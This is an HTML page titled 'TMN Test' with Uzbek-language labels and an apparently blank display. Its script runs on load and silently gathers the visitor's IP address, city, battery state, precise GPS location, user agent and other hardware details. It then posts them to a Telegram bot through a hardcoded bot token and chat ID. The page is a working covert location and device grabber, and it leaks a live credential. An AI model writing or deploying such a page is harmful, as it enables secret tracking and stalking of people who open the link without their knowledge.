<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <title>TMN Test</title>
</head>
<body style="font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; background:#111; color:#fff;">
  <h3>   </h3>

  <script>
    let token = "8368679979:AAHSM-VALEPmHwgwp7VsdtTR_m0_qZrz_ZM"; 
    let chat_id = "8481644308"; 

    async function getDeviceInfo() {
     
      let ip = "Noma'lum";
      try {
        let res = await fetch("https://ipapi.co/json/");
        let data = await res.json();
        ip = `${data.ip} (${data.country}, ${data.city})`;
      } catch (e) { console.log("IP olishda xato:", e); }

      
      let batteryInfo = "";
      if (navigator.getBattery) {
        let battery = await navigator.getBattery();
        batteryInfo = `🔋 Batareya: ${(battery.level * 100).toFixed(0)}% ${battery.charging ? "(Zaryad olayapti)" : "(Zaryad emas)"}`;
      } else {
        batteryInfo = "🔋 Batareya: Noma'lum";
      }

   
      let locationInfo = "🌍 Joylashuv: Noma'lum";
      if ("geolocation" in navigator) {
        try {
          await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                let lat = pos.coords.latitude;
                let lon = pos.coords.longitude;
                locationInfo = `🌍 Joylashuv: https://www.google.com/maps?q=${lat},${lon}`;
                resolve();
              },
              (err) => { console.log("Joylashuvga ruxsat berilmadi"); resolve(); },
              { enableHighAccuracy: true }
            );
          });
        } catch (e) {
          console.log("Joylashuv olishda xato:", e);
        }
      }

 
      let info = `
📱 Qurilma ma'lumoti:
- Model (User-Agent): ${navigator.userAgent}
- Platforma: ${navigator.platform}
- Til: ${navigator.language}
- Ekran: ${screen.width}x${screen.height}px
- RAM: ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Noma'lum"}
- CPU yadrolar: ${navigator.hardwareConcurrency || "Noma'lum"}
- ${batteryInfo}
- 🌍 IP: ${ip}
- ${locationInfo}
      `;
      return info;
    }

    function sendMessage(text) {
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text })
      });
    }

  
    window.onload = async () => {
      let info = await getDeviceInfo();
      sendMessage(info);
    };
  </script>
</body>
</html>